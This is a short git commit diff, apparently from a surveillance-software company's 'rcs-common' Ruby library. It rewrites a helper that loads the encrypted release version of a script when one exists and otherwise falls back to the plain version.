b466de2b5bb9637d818df565298269e1b39835b5
topac <topac@hackingteam.com>
2013-07-15 16:27:55 +0200

    fix

--- lib/rcs-common/path_utils.rb
+++ lib/rcs-common/path_utils.rb
@@ -4,16 +4,17 @@ module RCS
 
       # Requires an encrypted ruby script (rcs-XXX-releases folders) when
       # available, otherwise requires the clean version of it (rcs-XXX folders)
-  		def require_release path
-        unless path.start_with?("rcs-")
-          raise 'path must start with "rcs-"'
+  		def require_release(path)
+        if path.include?("-release")
+          new_path = path
+        else
+          new_path = path.gsub(/(.*)rcs-([^\/]+)/, '\1rcs-\2-release')
         end
 
-        if path.include?("-release") and File.exists?(path)
-          require path
-        else
-          require path.gsub('-release', '')
-        end
+        new_path << '.rb' unless new_path.end_with?('.rb')
+        new_path = File.exists?(new_path) ? new_path : new_path.gsub('-release', '')
+
+        require new_path
   		end
   	end
   end
